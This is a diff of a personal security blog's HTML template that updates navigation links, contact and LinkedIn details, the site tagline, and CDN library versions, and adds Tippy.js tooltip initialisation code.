       <ul class="pages">
-        
-        
-          <li class="nav-link"><a href="/about/">About</a>
-        
-        
-        
-        
-        
-        
-        
-        
-        
-          <li class="nav-link"><a href="/posts/">Posts</a>
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
-        
+				
+	
+	<li class="nav-link"><a href="/about/">About</a>
+	
+
+	
+
+	
+
+	
+	<li class="nav-link"><a href="/posts/">Posts</a>
+	
+
+	
+	<li class="nav-link"><a href="/wallofsheep/">Wall Of Sheep</a>
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+
       </ul>
     </div>
 
@@ -695,9 +680,9 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
       <p><strong>Contact</strong></p>
       <ul class="social-media-list">
         <li>
-          <a href="mailto:na">
+          <a href="mailto:@snoopysecurity">
             <i class="fa fa-envelope-o"></i>
-            <span class="username">na</span>
+            <span class="username">@snoopysecurity</span>
           </a>
         </li>
 
@@ -712,8 +697,6 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
           
         
           
-        
-          
           <li>
             <a href="https://github.com/snoopysecurity" title="Fork me on GitHub">
               <i class="fa fa-github"></i>
@@ -723,29 +706,12 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
           
         
           
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
+          <li>
+            <a href="https://www.linkedin.com/pub/sam-sanoop/47/769/60a" title="Connect with me on LinkedIn">
+              <i class="fa fa-linkedin"></i>
+              <span class="username">Sam Sanoop</span>
+            </a>
+          </li>
           
         
 
@@ -754,7 +720,7 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
 
     <div class="site-signature">
       <p class="rss-subscribe text"><strong>Subscribe <a href="/feed.xml">via RSS</a></strong></p>
-      <p class="text">Hacking to learn, while learning to hack.
+      <p class="text">Hack adventures while segfaulting through life
 </p>
     </div>
 
@@ -763,9 +729,11 @@ window.open('https://domgo.at/cxss/example/10?lang=en&amp;user=ID-javascript', '
 </footer>
 
 <!-- Scripts -->
-<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/8.5/highlight.min.js"></script>
-<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.7.1/js/lightbox.min.js"></script>
+<script src="//code.jquery.com/jquery-3.4.1.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/js/lightbox.min.js"></script>
+<script src="//unpkg.com/popper.js@1"></script>
+<script src="//unpkg.com/tippy.js@5"></script>
 
 <script type="text/javascript">
 $(document).ready(function() {
@@ -783,6 +751,15 @@ $(document).ready(function() {
       }
     });
   });
+
+	// Enable tooltips via Tippy.js
+	if (Array.isArray(window.tooltips)) {
+		window.tooltips.forEach(function(tooltip) {
+			var selector = tooltip[0];
+			var config = tooltip[1];
+			tippy(selector, config);
+		})
+	}
 });
 
 </script>
